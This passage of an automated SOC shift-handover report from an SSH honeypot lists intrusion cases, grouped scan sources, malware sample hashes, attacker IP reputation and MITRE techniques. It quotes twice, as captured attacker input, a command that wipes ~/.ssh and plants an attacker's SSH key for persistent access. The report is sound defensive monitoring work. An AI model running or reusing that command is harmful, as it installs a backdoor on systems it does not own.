| **Last Seen** | 2026-05-05 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:12:01` | `cowrie.session.connect` |
| `2026-05-05 06:12:01` | `cowrie.client.version` |
| `2026-05-05 06:12:01` | `cowrie.client.kex` |
| `2026-05-05 06:12:02` | `cowrie.login.success` |
| `2026-05-05 06:12:03` | `cowrie.session.params` |
| `2026-05-05 06:12:03` | `cowrie.command.input` |
| `2026-05-05 06:12:03` | `cowrie.command.failed` |
| `2026-05-05 06:12:03` | `cowrie.log.closed` |
| `2026-05-05 06:12:03` | `cowrie.session.params` |
| `2026-05-05 06:12:03` | `cowrie.command.input` |
| `2026-05-05 06:12:03` | `cowrie.session.file_download` |
| `2026-05-05 06:12:03` | `cowrie.log.closed` |
| `2026-05-05 06:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2090ad7fb66e

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-05 06:12 |
| **Last Seen** | 2026-05-05 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:12:06` | `cowrie.session.connect` |
| `2026-05-05 06:12:06` | `cowrie.client.version` |
| `2026-05-05 06:12:07` | `cowrie.client.kex` |
| `2026-05-05 06:12:07` | `cowrie.login.success` |
| `2026-05-05 06:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066775298245

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-05-05 06:16 |
| **Last Seen** | 2026-05-05 06:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:16:33` | `cowrie.session.connect` |
| `2026-05-05 06:16:33` | `cowrie.client.version` |
| `2026-05-05 06:16:33` | `cowrie.client.kex` |
| `2026-05-05 06:16:33` | `cowrie.login.success` |
| `2026-05-05 06:16:33` | `cowrie.session.params` |
| `2026-05-05 06:16:33` | `cowrie.command.input` |
| `2026-05-05 06:16:33` | `cowrie.command.failed` |
| `2026-05-05 06:16:33` | `cowrie.log.closed` |
| `2026-05-05 06:16:34` | `cowrie.session.params` |
| `2026-05-05 06:16:34` | `cowrie.command.input` |
| `2026-05-05 06:16:34` | `cowrie.session.file_download` |
| `2026-05-05 06:16:34` | `cowrie.log.closed` |
| `2026-05-05 06:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed164a10ec4e

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-05-05 06:16 |
| **Last Seen** | 2026-05-05 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:16:35` | `cowrie.session.connect` |
| `2026-05-05 06:16:35` | `cowrie.client.version` |
| `2026-05-05 06:16:35` | `cowrie.client.kex` |
| `2026-05-05 06:16:36` | `cowrie.login.success` |
| `2026-05-05 06:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `84.247.185[.]10` | **305** | 2026-05-05 03:20 | 2026-05-05 05:59 | 158m | 0 | `T1592` | 🟠 MEDIUM |
| `2.57.122[.]99` | **131** | 2026-05-05 03:31 | 2026-05-05 03:53 | 67m | 0 | `T1592` | 🟠 MEDIUM |
| `104.168.30[.]30` | **29** | 2026-05-05 03:36 | 2026-05-05 04:00 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.159.177[.]40` | **29** | 2026-05-05 03:21 | 2026-05-05 03:43 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.160.200[.]19` | **23** | 2026-05-05 05:47 | 2026-05-05 06:19 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.104[.]44` | **14** | 2026-05-05 05:58 | 2026-05-05 06:18 | 10m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.158.22[.]150` | **12** | 2026-05-05 06:01 | 2026-05-05 06:19 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.177.119[.]165` | **8** | 2026-05-05 05:28 | 2026-05-05 05:36 | 16m | 0 | `T1592` | 🟢 LOW |
| `120.48.175[.]122` | **5** | 2026-05-05 03:20 | 2026-05-05 03:24 | 8m | 0 | `T1592` | 🟢 LOW |
| `119.205.179[.]217` | **4** | 2026-05-05 03:21 | 2026-05-05 03:24 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `186.146.235[.]58` | **4** | 2026-05-05 03:20 | 2026-05-05 03:23 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]27` | **2** | 2026-05-05 03:54 | 2026-05-05 03:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.180.213[.]221` | **2** | 2026-05-05 05:00 | 2026-05-05 05:44 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.118.241[.]35` | **2** | 2026-05-05 04:46 | 2026-05-05 04:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `207.180.235[.]16` | **2** | 2026-05-05 03:23 | 2026-05-05 04:50 | 1m | 0 | `T1592` | 🟢 LOW |
| `3.151.241[.]153` | **2** | 2026-05-05 03:24 | 2026-05-05 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.67.161[.]178` | **2** | 2026-05-05 05:15 | 2026-05-05 05:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.64[.]124` | 1 | 2026-05-05 04:32 | 2026-05-05 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]141` | 1 | 2026-05-05 05:50 | 2026-05-05 05:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `207.254.135[.]209` | 1 | 2026-05-05 04:23 | 2026-05-05 04:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `39.126.101[.]130` | 1 | 2026-05-05 06:09 | 2026-05-05 06:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]20` | 1 | 2026-05-05 05:23 | 2026-05-05 05:23 | 7s | 0 | `T1592` | 🟢 LOW |
| `72.205.180[.]198` | 1 | 2026-05-05 05:19 | 2026-05-05 05:19 | 11s | 0 | `T1592` | 🟢 LOW |
| `99.249.183[.]228` | 1 | 2026-05-05 04:46 | 2026-05-05 04:48 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `207.180.235[.]16` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `207.254.135[.]209` | JM | FLOW | **100** ⚠️ | 7 |
| `120.48.175[.]122` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `84.247.185[.]10` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `186.146.235[.]58` | CO | Telmex Colombia S.A. | **100** ⚠️ | 6 |
| `3.151.241[.]153` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `39.126.101[.]130` | KR | SK Broadband Co Ltd | **100** ⚠️ | 1 |
| `106.13.64[.]124` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.158.22[.]150` | IQ | Trade Link Logistics General Trading & Contracting Company W.L.L., L.L.C. | **100** ⚠️ | 50 |
| `180.76.104[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 203 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 107 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 50 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |

---

## 🔕 False Positive Summary (102 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 32 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 58 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 734 cases |
| Tool 34  | Credential Extractor        | ✅ 157 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 102 filtered (13.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 49 priority case(s) shown individually · 24 recon entry/entries in table (17 group(s) consolidating 576 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-05T06:20:54Z_
